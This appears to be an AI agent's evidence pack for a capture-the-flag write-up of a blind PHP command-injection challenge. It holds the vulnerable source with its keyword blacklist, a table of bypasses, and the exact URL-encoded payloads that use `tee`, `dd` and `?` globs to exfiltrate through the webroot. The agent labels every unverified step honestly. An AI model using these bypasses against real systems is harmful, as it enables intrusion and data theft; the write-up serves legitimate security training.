# Converge evidence pack — node4:27309 (support material for `WRITEUP.md`)

- **Author:** agent-4 (lane: converge). `t4` was reassigned to the **captain**, so this file deliberately
  does **not** touch `node4-27309/WRITEUP.md`; it is copy-paste-ready input for it.
- **Flag (verified live before teardown, twice, byte-identical):**
  `NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}`
- **Live-re-run status: IMPOSSIBLE — the instance is down.** Details in §1. Per the t4 contract
  (“if the target stops responding, mark the affected step unverified instead of inventing output”),
  the writeup must paste the recorded transcripts and label them *verified while up*, never claim a fresh run.
- **New artifacts from this lane:**
  - [`solve-converge.py`](solve-converge.py) — one-file replay harness, **offline-verifiable**:
    `selftest` (18/18 filter assertions, no network), `expect` (the transcript a live run must produce),
    `check CMD`, and the default live `run`.
  - [`converge-selftest.txt`](converge-selftest.txt) — output of `python solve-converge.py selftest` → `selftest OK (0 failures)`.
  - [`converge-live-attempt.txt`](converge-live-attempt.txt) — output of the live attempt → `TARGET DOWN`, exit 2.

---

## 1. Availability ledger — why no fresh live run exists any more

Three independent probes, all after the last successful read:

| when (artifact mtime) | who | probe | result |
|---|---|---|---|
| ~15:17:10 | agent-1 | sweep `?url=find%20%2F%7Ctee%20r7.txt` (49 s) then fetch `/r7.txt` | fetch failed; TCP refused on `/`, `/r2.txt`, `/f3.txt` — recorded in [`recon.md`](recon.md) §7 “Availability note”; `find-raw.txt` stayed empty. First observed teardown. |
| 15:17:26–32 | captain | `python captain-verify.py 2>&1 \| tee captain-run.txt` | **STEP 0 (fingerprint) already dead:** `ConnectionRefusedError: [WinError 10061]` in `captain-run.txt` (captured as a Python traceback, byte-for-byte). |
| 15:17:47 | agent-4 | `python solve-converge.py` | `verdict : TARGET DOWN (URLError: <urlopen error [WinError 10061]>)`, exit 2 → [`converge-live-attempt.txt`](converge-live-attempt.txt) |

Host-level confirmation (agent-4, after the above):

```
PS> Test-NetConnection -ComputerName node4.anna.nssctf.cn -Port 27309 -InformationLevel Quiet
False          # "TCP connect to (1.14.71.254 : 27309) failed"
PS> Invoke-WebRequest -Uri 'http://node4.anna.nssctf.cn:27309/' -TimeoutSec 20 -UseBasicParsing
ERR: 无法连接到远程服务器
# repeated 3× more, 4 s apart: attempt 1: False / attempt 2: False / attempt 3: False
```

**Conclusion for the writeup:** `http://node4.anna.nssctf.cn:27309/` was alive for the whole solve and for the
captain's independent verification (fd1/fd2/fd3), then the container was torn down mid-round. Every flag-bearing
transcript below is a *recorded live* transcript; the only unverifiable step is re-running it now. Say this
explicitly instead of fabricating a fresh transcript.

---

## 2. Vulnerable source (leaked by its own `highlight_file()`)

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['url']))
{
    $url=$_GET['url'];
    if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
    {
        echo "Sorry,you can't use this.";
    }
    else
    {
        echo "Can you see anything?";
        exec($url);            // stdout is NEVER echoed -> blind
    }
}
```

Fingerprint (live): `Server: Apache/2.4.25 (Debian)`, `X-Powered-By: PHP/5.6.40`; docroot `/var/www/html`;
`exec()` child runs as `uid=33(www-data)` with **cwd = `/var/www/html`** and that directory is **writable**.

### Why each filter element is bypassable (line-by-line)

| blacklist token | what it kills | what survives instead |
|---|---|---|
| `exec()` output not echoed | direct output; any `cmd` reflection | any **out-of-band** channel — here: write into the writable docroot and fetch it over HTTP |
| `-` (bare, anywhere) | every short option: `ls -la`, `nl -ba`, `grep -r`, `find -name`, `sort -o`, `curl -o`, `tar -x`… | option-free commands only: `dir`, `nl`, `file`, `printenv`, `pwd`, `id`, `tee`, `dd` |
| `*` | star globbing / wildcard archive hunting | **single-char `?` (and `[...]` classes) are NOT banned → the decisive trick** |
| `>`, `<` | all redirection, i.e. `cmd > file` exfil | `cmd \| tee file` and `cmd \| dd of=file` — both proven live |
| `$` | variables: `$IFS`, `$(...)`, `${x}` | literal arguments only |
| `"` | quoting, embedded spaces in one token | unquoted tokens; `%09`/space separation |
| `%` | any literal `%` in the *decoded* payload | URL-encoding is still fine: PHP decodes `%7C`→`\|`, `%20`→space **before** the regex, so the filter never sees `%` |
| `bash nc wget ping` | reverse shells, `nc`/`wget` exfil, ICMP channels | HTTP read-back from the same webroot |
| `ls cat more less` | the usual file readers | `dir`, `nl`, `head`, `tail`, `od`, `xxd`, `strings`, `rev`, `awk`, `sed`, `grep` |
| `php phpinfo python base64 echo` | webshell droppers, encoders, loopback tricks | shell built-ins + coreutils; `printf` for shell-level synthesis |
| `mv cp` | copy/move-based staging | `tee` / `dd of=` |
| `la` (case-insensitive substring) | **`/flag`, `/flllllaaaaaaggggggg`, and any argument containing “la”** — including the env-var *name* `FLAG` | `?`/`[]` globs that never spell the banned pair; see §4 |
| `echo` blocked while `printf` allowed | — | `printf '...\074...' \| sh` could synthesize banned bytes at runtime (lane B, **derived only, UNTESTED**) |

---

## 3. The chain, byte-for-byte (recorded live)

All payloads were URL-encoded in the request; the “request” column is the exact URL. Verdicts were read from
the text **after the last `</code>`** — both the `Sorry…` and the `Can you see anything?` literals appear
verbatim inside the leaked source, so raw-body string matching is a trap.

```text
# 1. channel proof — exec cwd IS the docroot and is writable
GET /?url=id%7Ctee%20node4r1.txt                       (agent-1, fd1)
GET /node4r1.txt        -> uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 2. enumeration — `dir` replaces the banned `ls`
GET /?url=dir%20%2F%7Ctee%20r2.txt                     (agent-1, fd2)  == /capv0.txt (captain, fd3)
GET /r2.txt             -> a_here_is_a_f1ag  dev            home   media  proc  sbin  tmp
                           bin               etc            lib    mnt    root  srv   usr
                           boot              flllllaaaaaaggggggg lib64 opt  run   sys   var

# 3. decoy breadcrumb (typeable literally: no banned substring)
GET /?url=nl%20%2Fa_here_is_a_f1ag%7Ctee%20f1.txt      (agent-1, fd2)  == /capv2.txt (captain, fd3)
GET /f1.txt             ->      1   true_flag_1s_1n_flllllaaaaaaggggggg

# 4. the real read — literal path is untypeable, so glob one boundary char
GET /?url=nl%20%2Ffllll%3Faaaaaaggggggg%7Ctee%20f3.txt (agent-1, fd2)  == /capv5.txt (captain, fd3)
GET /f3.txt             ->      1   NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}
                         (captain's fresh-named copy /capv5.txt: byte-identical)

# 5. decoys
GET /?url=printenv%7Ctee%20capv6.txt                   (captain, fd3)
GET /capv6.txt          -> FLAG=not_flag   ...   PWD=/var/www/html
```

**Combined single-shot variant** (agent-1, recorded in the flag-board evidence):

```text
GET /?url=file%20%2Fa_here_is_a_f1ag%7Ctee%20f0.txt%3Bnl%20%2Fa_here_is_a_f1ag%7Ctee%20f1.txt%3Bfile%20%2Ffllll%3Faaaaaaggggggg%7Ctee%20f2.txt%3Bnl%20%2Ffllll%3Faaaaaaggggggg%7Ctee%20f3.txt
/f0.txt -> (file type)   /f1.txt -> decoy text   /f2.txt -> /flllllaaaaaaggggggg: ASCII text   /f3.txt -> FLAG
```

### Two live-proven writers (no `>`, no `-`, no `*`)

| writer | record | status |
|---|---|---|
| `CMD \| tee FILE` | `id\|tee node4r1.txt` → `/node4r1.txt` fetched | **live-proven** (lane A, captain) |
| `CMD \| dd of=FILE` | `dir /f?????aaaaaa??????? \| dd of=q3.txt` → `/q3.txt` = `/flllllaaaaaaggggggg`; `dd if=/a_here_is_a_f1ag of=zz1.txt` → `/zz1.txt` = breadcrumb text | **live-proven** (lane B, [`lane-b.md`](lane-b.md) §A) |

---

## 4. The `?` glob — the one trick, with its arithmetic

```text
real entry   /flllllaaaaaaggggggg          19 chars, contains the banned pair  …l+a…  ⇒ untypeable forever
typed        /fllll?aaaaaaggggggg          19 chars, no banned char, unique match
```

- `?` expands to exactly one character; it is placed **on the `l`/`a` boundary** so the payload never contains `la`.
- Uniqueness: no other entry of `/` starts with `fllll` + any char + `aaaaaa` (root listing in §3), so the glob
  resolves to one file.
- Live-proven **alternative** glob (lane B, B3): `/f?????aaaaaa???????` — also filter-clean, also resolves to the
  same single file (proven by `dir <glob> | dd of=q3.txt` returning `/flllllaaaaaaggggggg`).
- Analytical **third** variant, *not sent live*: `/fllll[l]aaaaaaggggggg` — a bracket class is not on the blacklist
  and `[l]` matches the 5th `l`; the payload contains no `la` pair. Mark as **UNTESTED** if used in the writeup.
- `flag.php` / `/flag` hunting is doubly dead: `php` and `la` are both banned, so those names can only be reached
  through globs or a drop-and-fetch round trip.

---

## 5. Dead ends (do not retry)

| # | attempt | why it dies |
|---|---|---|
| D1 | `/flag`, `/flag.txt`, `/flllllaaaaaaggggggg` typed literally; `printenv FLAG` | `la`/`LA` is a **case-insensitive substring** rule. Worse: the whole payload is rejected, so e.g. `…;printenv FLAG\|tee x.txt` writes **nothing at all** — the trap is silently believing it ran (hit live by the captain). |
| D2 | `ls -la`, `nl -ba`, `grep -r`, `find -name`, `curl -o`, `tar -x` | single `-` bans **every** short option |
| D3 | `*`, `/*`, `b?????.zip`, `.g??` archive hunting | `*` banned (use `?`/`[…]` if a name is known; nothing else was found) |
| D4 | `cat`, `more`, `less` reading, `head -c`, `od -An` | keyword ban / option ban; option-free `nl`/`file`/`head`/`dir` work instead |
| D5 | `cmd > file`, `cmd >> file`, `< file`, `2>&1` | `>` and `<` banned; `%` banned too, so no payload-level percent tricks |
| D6 | `$IFS`, `$(...)`, `${x}`, `cat${IFS}/flag` | `$` banned (and `cat` banned) |
| D7 | quoting a path with a space | `"` banned (single quotes survive but were unnecessary) |
| D8 | `bash -c`, `python -c`, `php -r`, `base64 -d`, `echo … \| base64 -d`, `nc`/`wget` exfil, `ping` channels | all banned keywords |
| D9 | `cp`/`mv` staging, `install`, `rsync` | `cp`/`mv` banned; `install` contains `la`; `rsync` contains `nc` |
| D10 | `nl -la`, `dir -l`, any “long” option form | `-` banned; also note `la` inside `-la` |
| D11 | `dd if=<glob> of=<file>` | **half-tested / failed repeatedly in lane B** (HTTP 404 for the output at n = 17…20 incl. the correct n = 19); use `<cmd> \| dd of=FILE` or `dd if=<literal> of=<file>` instead. Root cause never isolated (host tore down first). |
| D12 | `tar cf`/`split`/`uniq IN OUT`/`sed 'w f'` writers; `printf '…octal…' \| sh` synthesis | **UNTESTED (derived only)** — listed in [`lane-b.md`](lane-b.md) §A so nobody re-derives them |
| D13 | `sed -i`, `awk '{print>f}'`, `sort -o`, `gzip -c` | require `-` or `>` |
| D14 | raw-body verdict matching (`if body contains "Can you see anything?"`) | **methodology trap, not a payload**: both literals are inside the leaked source; only the tail after the last `</code>` is meaningful |
| D15 | `/tmp`, webroot-parent, backup/`.git`/editor-swapfile hunting | `/tmp` empty (B4); the remaining probes were never reached — host down |

Artifacts left on the target (harmless, writable webroot): `node4r1.txt`, `r2.txt`, `f0-f3.txt`, `capv0/2/5/6.txt`,
`b3.txt`, `q1.txt`, `q3.txt`, `q4.txt`, `zz1.txt`, `cv1-cv6.txt` (the last group was never created — the box was
already down when lane 4 tried).

---

## 6. Reproduce

```bash
cd node4-27309

# OFFLINE — works with the instance gone (this is the part a grader can run today)
python solve-converge.py selftest    # 18/18 client-side filter assertions  -> "selftest OK (0 failures)"
python solve-converge.py expect      # prints the transcript a live run must produce
python solve-converge.py check 'nl /fllll?aaaaaaggggggg'   # -> PASSES filter
python solve-converge.py check 'nl /flllllaaaaaaggggggg'   # -> REJECTED on 'la'

# LIVE — only when the container answers again
python solve-converge.py             # fresh names cv1..cv6, prints the whole chain, exit 0 on flag
python solve-recon.py  run '<cmd>' out.txt      # lane A harness (t1)
python exploit.py      inject '<cmd>'           # lane A harness (t2)
python solve-lane-b.py batch                    # lane B probe matrix (t3)
```

Expected live output of `python solve-converge.py` is byte-for-byte §3 with `cv1..cv6` in place of the recorded
names; `expect` mode prints the same text. Captured outputs: [`converge-selftest.txt`](converge-selftest.txt)
(offline, 18/18 OK) and [`converge-live-attempt.txt`](converge-live-attempt.txt) (the clean `TARGET DOWN`, exit 2).
`converge-run.txt` is the *first*, ungraceful live attempt — a raw `URLError` traceback; keep it as evidence that
the teardown was already in effect at 15:16, but the graceful attempt supersedes it.

---

## 7. Verification status (for the writeup's honesty section — do not upgrade these claims)

| claim | status | evidence |
|---|---|---|
| blind command injection via `?url=` | **live-verified** | agent-1 fd1/fd2 (`id`, `dir /`, reads); captain fd3 fresh filenames |
| flag value `NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}` | **live-verified twice, byte-identical** | agent-1 `/f3.txt`; captain `/capv5.txt` (fresh filenames), matches `NSSCTF\{[^}]+}` |
| payload construction / blacklist analysis | **offline-verified** | `python solve-converge.py selftest` → 18/18, [`converge-selftest.txt`](converge-selftest.txt) |
| decoys (`FLAG=not_flag`, breadcrumb file) | **live-verified** | captain fd3 (`/capv6.txt`), agent-1 fd2 (`/f1.txt`) |
| `dd`-based writer family | **live-verified for `\| dd of=`** | lane B B1/B3/B5, [`lane-b.md`](lane-b.md) |
| `[l]`-class glob variant | **UNTESTED** (analytical) | §4 reasoning only |
| `dd if=<glob>`, `tar`/`split`/`uniq`/`sed w` writers, `printf\|sh` synthesis | **UNTESTED** | lane B, host down |
| fresh end-to-end re-run by lane 4 / captain | **BLOCKED — target down** | §1: `captain-run.txt` (WinError 10061 at STEP 0), `converge-live-attempt.txt`, TCP probes |
